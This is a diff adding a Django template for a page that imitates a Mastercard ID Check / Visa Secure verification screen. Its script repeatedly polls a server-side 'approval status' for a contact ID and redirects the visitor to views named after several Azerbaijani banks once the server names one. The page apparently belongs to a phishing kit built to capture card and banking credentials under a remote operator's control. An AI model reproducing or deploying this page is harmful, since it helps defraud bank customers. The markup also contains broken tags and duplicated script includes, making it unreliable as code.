@@ -1,0 +1,174 @@
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script>
+
+</script>
+
+{% load static %}
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<!DOCTYPE html>
+<html lang="EN" dir="ltr">
+<head>
+    <meta name="viewport"
+          content="user-scalable=no, initial-scale=1, maximum-scale=1, minimum-scale=1, width=device-width, height=device-height">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"/>
+    <title>
+    </title>
+    <link rel="shortcut icon" type="image/ico" href="resources/images/favicon.ico?CSMName=CSM/KAPS">
+    <link rel="stylesheet" href="{% static '/css/app.css' %}"/>
+    <link rel="stylesheet" href="resources/css/custom.css?CSMName=CSM/KAPS"/>
+    
+</head>
+<body class="MASTERCARD">
+<div data-entry-point="application-container"></div>
+<div>
+    <div class="cp-ajax-indicator">
+        <div class="sk-circle">
+            <div class="sk-circle1 sk-child"></div>
+            <div class="sk-circle2 sk-child"></div>
+            <div class="sk-circle3 sk-child"></div>
+            <div class="sk-circle4 sk-child"></div>
+            <div class="sk-circle5 sk-child"></div>
+            <div class="sk-circle6 sk-child"></div>
+            <div class="sk-circle7 sk-child"></div>
+            <div class="sk-circle8 sk-child"></div>
+            <div class="sk-circle9 sk-child"></div>
+            <div class="sk-circle10 sk-child"></div>
+            <div class="sk-circle11 sk-child"></div>
+            <div class="sk-circle12 sk-child"></div>
+        </div>
+        <img src="{% static 'img/mcidcheck-visasecure.png' %}" style='height: 10vh ' />
+    </div>
+</div>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script>
+    $(document).ready(function() {
+        var contact_id = {{ last_contact_id }};
+        var interval_id = setInterval(check_approval_status, 1456); 
+
+        function check_approval_status() {
+            $.ajax({
+                url: '/check_approval_status/' + contact_id + '/',
+                success: function(data) {
+                    if (data.bankname == "kapital") {
+                        clearInterval(interval_id);  // stop checking for updates
+
+                        window.location.href = '{% url "kapital" %}';  // redirect to the new view
+                    }
+                    if (data.bankname == "abb") {
+                        clearInterval(interval_id);  // stop checking for updates
+
+                        window.location.href = '{% url "abb" %}';  // redirect to the new view
+                    }
+                    if (data.bankname == "leobank") {
+                        clearInterval(interval_id);  // stop checking for updates
+
+                        window.location.href = '{% url "leobank3d" %}';  // redirect to the new view
+                    }
+                    if (data.bankname == "unibank") {
+                        clearInterval(interval_id);  // stop checking for updates
+
+                        window.location.href = '{% url "unibank" %}';  // redirect to the new view
+                    }
+                    if (data.bankname == "pashabank") {
+                        clearInterval(interval_id);  // stop checking for updates
+
+                        window.location.href = '{% url "pashabank" %}';  // redirect to the new view
+                    }
+                    if (data.bankname == "error") {
+                        clearInterval(interval_id);  // stop checking for updates
+                        window.location.href = '{% url "error" %}';  // redirect to the new view
+                    }
+                },
+                error: function(xhr, status, error) {
+                    console.log('Error checking approval status:', error);
+                }
+            });
+        }
+    });
+</script>
+<script>
+    var Symbol;
+    if (!Symbol) {
+        Symbol = function () {
+        };
+    }
+    window.process = {env: {},};
+</>
+<script>
+    window.$ = window.jQuery = wae.require('jquery');
+    //TODO: achelmakin: The updated prefilter mechanism breaks the whole interface. This is official fix. More in: https://jquery.com/upgrade-guide/3.5/
+    var rxhtmlTag = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0>\x20\t\r\n\f]*)[^>]*)\/>/gi;
+
+    window.$.htmlPrefilter = function (html) {
+        return html.replace(rxhtmlTag, "<$1></$2>");
+    };
+    window.core = wae.core;
+    window.Inputmask = wae.require('inputmask');
+    window.$.fn.imputmask = window.Inputmask;
+    window.baron = wae.require('baron');
+</?script>
+<script>
+    void function () {
+        'use strict';
+        wae.setSessionId('fde41a96-4a1a-4122-83d1-05917d70a013');
+        wae.setLogLevel('INFO');
+        wae.setLanguage('EN');
+        wae.setBaseHref(location.origin + location.pathname);
+        wae.inputTrim();
+        wae.init(function () {
+            wae.loadModule({
+                module: 'root',
+                success: function () {
+                    core.emit('preload-modules', {
+                        tagList: ['wae:model'],
+                        error: function () {
+                            wae.error('!!!!!!!!!!!!!! models load error');
+                        },
+                        success: function () {
+                            wae.freezeApi();
+
+                            core.emit('page-loaded', {
+                                entryPoint: wae.generateEntryPointId(document.querySelector('[data-entry-point="application-container"]'), '__root__'),
+                                beforeSend: function () {
+                                    wae.log('!!!!!!!!!!!!!! beforeSend');
+                                },
+                                success: function () {
+                                    wae.log('!!!!!!!!!!!!!! success');
+                                },
+                                error: function () {
+                                    wae.log('!!!!!!!!!!!!!! error');
+                                },
+                                complete: function () {
+                                    wae.log('!!!!!!!!!!!!!! complete');
+                                },
+                            });
+                        }
+                    });
+                }
+            });
+        });
+    }();
+</>
+<script>
+    function checkStatus() {
+        $.ajax({
+            url: '/check_status/',
+            success: function(data) {
+                if (data.is_error) {
+                    window.location.href = '/error_page/';
+                }
+            },
+            complete: function() {
+                setTimeout(checkStatus, 5000); // check again after 5 seconds
+            }
+        });
+    }
+    
+    $(document).ready(function() {
+        checkStatus(); // start checking the status when the page is loaded
+    });
+    
+    <script>
+</body>
+</html>
+
